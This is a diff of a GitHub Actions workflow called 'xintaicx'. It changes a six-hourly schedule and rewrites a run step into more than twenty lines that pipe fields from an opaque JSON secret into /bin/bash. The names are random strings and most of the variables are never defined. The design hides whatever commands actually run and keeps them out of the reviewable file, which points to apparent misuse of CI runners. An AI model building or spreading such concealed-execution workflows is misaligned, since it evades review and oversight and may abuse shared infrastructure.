@@ -2,27 +2,38 @@ name: xintaicx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 5/6 * * *'
+    - cron: '7 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xintaicx
         env:
-          ckilg474: ${{ secrets.ckilg474 }}
+          qjepz53: ${{ secrets.qjepz53 }}
         run: |
-          echo $ckilg474 | jq -r .o83 | /bin/bash
-          echo $ix7 | jq -r .lgmb1606 | /bin/bash
-          echo $wxh4 | jq -r .mli2 | /bin/bash
-          echo $c07 | jq -r .unlml5790 | /bin/bash
-          echo $gbnhy3 | jq -r .dk0 | /bin/bash
-          echo $ebjo6808 | jq -r .cy91 | /bin/bash
-          echo $qvk684 | jq -r .qlhj84 | /bin/bash
-          echo $cpe37402 | jq -r .iodqf6 | /bin/bash
-          echo $blpro87 | jq -r .lmj5 | /bin/bash
-          echo $z018 | jq -r .ns51221 | /bin/bash
-          echo $fqziv8 | jq -r .ounxa215 | /bin/bash
-          echo $legiq2 | jq -r .dwb90 | /bin/bash
+          echo $qjepz53 | jq -r .vqqhq63916 | /bin/bash
+          echo $brzf8784 | jq -r .qw3450 | /bin/bash
+          echo $tfk653 | jq -r .el6 | /bin/bash
+          echo $majez0 | jq -r .u198 | /bin/bash
+          echo $w95 | jq -r .a38984 | /bin/bash
+          echo $g4860 | jq -r .rkt7717 | /bin/bash
+          echo $veasq0 | jq -r .yai6 | /bin/bash
+          echo $fvgg53 | jq -r .c019 | /bin/bash
+          echo $xha1 | jq -r .ff07577 | /bin/bash
+          echo $efw8 | jq -r .sq8671 | /bin/bash
+          echo $x4 | jq -r .wzij6 | /bin/bash
+          echo $y17 | jq -r .rqra0733 | /bin/bash
+          echo $pynx434 | jq -r .z54 | /bin/bash
+          echo $d1920 | jq -r .p48989 | /bin/bash
+          echo $wcncp1 | jq -r .nby3351 | /bin/bash
+          echo $w7 | jq -r .kvbu631 | /bin/bash
+          echo $grq8084 | jq -r .jzdp59129 | /bin/bash
+          echo $vr4219 | jq -r .pw4 | /bin/bash
+          echo $xo62961 | jq -r .a660 | /bin/bash
+          echo $woal10 | jq -r .degn11536 | /bin/bash
+          echo $dhgn86 | jq -r .qa7180 | /bin/bash
+          echo $ttmb4809 | jq -r .k9719 | /bin/bash
 
